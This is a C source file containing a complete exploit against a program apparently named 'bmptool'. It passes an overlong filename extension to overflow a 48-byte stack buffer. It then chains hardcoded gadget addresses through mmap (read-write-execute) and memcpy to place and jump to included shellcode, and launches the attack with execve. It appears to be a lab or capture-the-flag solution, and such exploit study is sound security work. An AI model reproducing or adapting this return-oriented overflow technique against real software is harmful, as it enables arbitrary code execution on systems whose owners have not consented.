#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = {
#include "stack-shellcode.h"
};

unsigned char setup[] = {
#include "stack-setup.h"
};

uint32_t addr_mmap   = 0x08048a30;
uint32_t addr_memcpy = 0x08048990;
uint32_t addr_pop6   = 0x08049756;
uint32_t addr_pop3   = 0x0804ac5b;
// uint32_t addr_dest   = 0x41414000; // this is set from setup
uint32_t addr_src    = 0x08050d71;
uint32_t addr_setup  = 0x08050ddd;

int main(void)
{
  struct _overflow {
    unsigned char dot;           /* the dot before the file extension */
    char buf[48];       /* buffer that we overflow */

    uint32_t call0; /* step code to create the zeros in the exploit */

    uint32_t call1; /* mmap */
    uint32_t ret1; /* pop6 */
    uint32_t arg1_1;  // set from the setup code
    uint32_t arg1_2;  // set from the setup code
    uint32_t arg1_3;  // set from the setup code
    uint32_t arg1_4;  // set from the setup code
    uint32_t arg1_5;  // set from the setup code
    uint32_t arg1_6;  // set from the setup code

    uint32_t call2; /* memcpy */
    uint32_t ret2;  /* pop3 */
    uint32_t arg2_1;
    uint32_t arg2_2; // set from the setup code
    uint32_t arg2_3;

    uint32_t call3; /* shellcode */  // set from the setup code

    char setup[120];
    
    unsigned char nul;  /* terminate string */

  } __attribute__((packed)) overflow;

  memset(&overflow, 'A', sizeof(overflow));

  /* a dot is needed as it is only the file extension that is copied to the stack */
  overflow.dot = '.';

  /* place the shellcode in the beginning of the buffer */
  memcpy(overflow.buf, shellcode, sizeof(shellcode));
  memcpy(overflow.setup, setup, sizeof(setup));

  overflow.call0  = addr_setup;

  overflow.call1  = addr_mmap;
  overflow.ret1   = addr_pop6;
  // overflow.arg1_1 = addr_dest;
  // overflow.arg1_2 = 0x00001000; /* page size = 1K */
  // overflow.arg1_3 = 0x00000007; /* R, W, X */
  // overflow.arg1_4 = 0x00000032; /* flags */
  // overflow.arg1_5 = 0xffffffff; /* file descriptor */
  // overflow.arg1_6 = 0x00000000; /* offset */

  overflow.call2  = addr_memcpy;
  overflow.ret2   = addr_pop3;
//  overflow.arg2_1 = addr_dest;
  overflow.arg2_2 = addr_src;
//  overflow.arg2_3 = sizeof(shellcode);

  // overflow.call3  = addr_dest;

  /* terminate the string */
  overflow.nul = '\0';

  /* create argv */
  char *argv[] = { "./bmptool", "-read", (char *)&overflow, NULL };

  /* execute exploit */
  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}
